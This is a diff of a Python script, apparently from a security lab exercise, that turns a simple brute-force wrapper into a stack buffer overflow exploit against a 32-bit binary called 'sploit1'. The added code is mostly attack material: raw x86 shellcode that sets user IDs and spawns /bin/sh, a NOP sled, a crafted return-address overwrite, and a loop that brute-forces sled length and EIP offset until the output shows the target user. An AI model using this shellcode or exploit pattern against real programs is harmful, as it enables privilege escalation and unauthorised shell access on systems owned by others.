@@ -1,34 +1,48 @@
-import os
 import subprocess
-import itertools
+import struct
 
-# Function to compile the sploit1.c file
-def compile_sploit():
-    cmd = "gcc -ggdb -m32 sploit1.c -o sploit1"
-    subprocess.call(cmd, shell=True)
+shellcode = (
+    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
+    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
+    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
+)
 
-# Function to run the sploit1 program with specific values
-def run_sploit(buffer_size, offset_to_ret, return_address_offset):
-    cmd = f"echo whoami | ./sploit1 {buffer_size} {offset_to_ret} {return_address_offset}"
-    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-    return result.stdout, result.stderr
+stack_start = 0xffffd4cc 
+ebp_offset = 44
+eip_offset = 48
 
-# Brute-force the values
-buffer_sizes = range(100, 1000, 100)
-offset_to_ret_values = range(0, 100, 4)
-return_address_offsets = range(0, 1000, 50)
+def run_exploit(payload):
+    with open("payload", "wb") as f:
+        f.write(payload)
+    
+    p = subprocess.Popen(["./sploit1"], stdin=open("payload", "rb"), stdout=subprocess.PIPE)
+    output = p.stdout.read().strip()
+    
+    return b"targetuser" in output
 
-for buffer_size, offset_to_ret, return_address_offset in itertools.product(buffer_sizes, offset_to_ret_values, return_address_offsets):
-    print(f"Trying buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")
-    compile_sploit()
-    stdout, stderr = run_sploit(buffer_size, offset_to_ret, return_address_offset)
+def build_payload(nop_length, eip_offset):
+    nop_sled = b"\x90" * nop_length
+    eip_address = struct.pack("<I", stack_start + eip_offset)
+    
+    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
+    if padding_length < 0:
+        raise ValueError("NOP sled and shellcode are too large to fit in the buffer")
+    
+    padding = b"A" * padding_length
+    
+    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
+    return payload
 
-    if "Segmentation fault" not in stderr:
-        print(f"Success with buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")
-        print("stdout:")
-        print(stdout)
-        print("stderr:")
-        print(stderr)
-        break
-    else:
-        print(f"Failed with buffer_size: {buffer_size}, offset_to_ret: {offset_to_ret}, return_address_offset: {return_address_offset}")
+for nop_len in range(1, 100):
+    for eip_off in range(-500, 500, 4):
+        try:
+            payload = build_payload(nop_len * 4, eip_off)
+        except ValueError:
+            continue
+        
+        if run_exploit(payload):
+            print(f"Exploit succeeded with {nop_len*4} byte NOP sled and EIP overwrite {hex(stack_start + eip_off)}")
+            exit(0)
+
+print("Exploit failed")
